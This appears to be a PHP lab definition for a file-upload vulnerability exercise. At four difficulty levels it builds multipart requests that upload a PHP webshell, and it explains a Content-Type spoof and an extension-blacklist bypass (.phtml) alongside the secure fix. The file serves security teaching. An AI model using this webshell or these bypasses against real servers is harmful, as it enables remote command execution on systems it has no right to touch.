<?php
$bnd = 'FORGEBOUNDARY';
$mk = function ($filename, $partType) use ($bnd) {
  $shell = "<?php system(\$_GET['c'] ?? 'id'); ?>";
  $body = "--$bnd\r\nContent-Disposition: form-data; name=\"avatar\"; filename=\"$filename\"\r\nContent-Type: $partType\r\n\r\n$shell\r\n--$bnd--\r\n";
  return ['method' => 'POST', 'path' => '/labs/upload-avatar/run', 'headers' => "Content-Type: multipart/form-data; boundary=$bnd", 'body' => $body];
};
return [
  'low' => [
    'goal' => "Upload a PHP file and run it from the uploads folder.",
    'steps' => [
      "No checks are applied, so upload shell.php containing a small webshell.",
      "The response gives the stored path; request /uploads/shell.php?c=cat /opt/forge/flag.txt to run commands.",
      "The default request already carries the shell; running it stores the file.",
    ],
    'why' => "The file is stored in a web-served, script-executing directory with its PHP extension intact, so requesting it later runs your code as the web server user.",
    'run' => [$mk('shell.php', 'application/octet-stream')],
  ],
  'medium' => [
    'goal' => "Bypass the Content-Type check.",
    'steps' => [
      "The server trusts the uploaded part's Content-Type.",
      "Keep filename=\"shell.php\" but set the part's Content-Type to image/png.",
    ],
    'why' => "The Content-Type of a multipart part is attacker-controlled, so declaring image/png satisfies the check while the file is still saved as executable PHP.",
    'run' => [$mk('shell.php', 'image/png')],
  ],
  'high' => [
    'goal' => "Use an extension the blacklist misses.",
    'steps' => [
      "The blacklist blocks php, php3, php4, php5, pht, but not phtml.",
      "Upload shell.phtml; this server executes .phtml as PHP.",
    ],
    'why' => "An incomplete extension blacklist always leaves an executable variant. .phtml is handled by PHP here, so the uploaded file still runs.",
    'run' => [$mk('shell.phtml', 'application/octet-stream')],
  ],
  'secure' => [
    'goal' => "Confirm content checks plus a random name stop execution.",
    'steps' => [
      "The server verifies real image bytes, forces an image extension, and renames the file randomly.",
      "Upload the PHP shell and watch it be rejected.",
    ],
    'why' => "Because the file must be a real image and is stored with a safe, random image name, there is no attacker-chosen executable file to request.",
    'run' => [$mk('shell.php', 'image/png')],
  ],
];
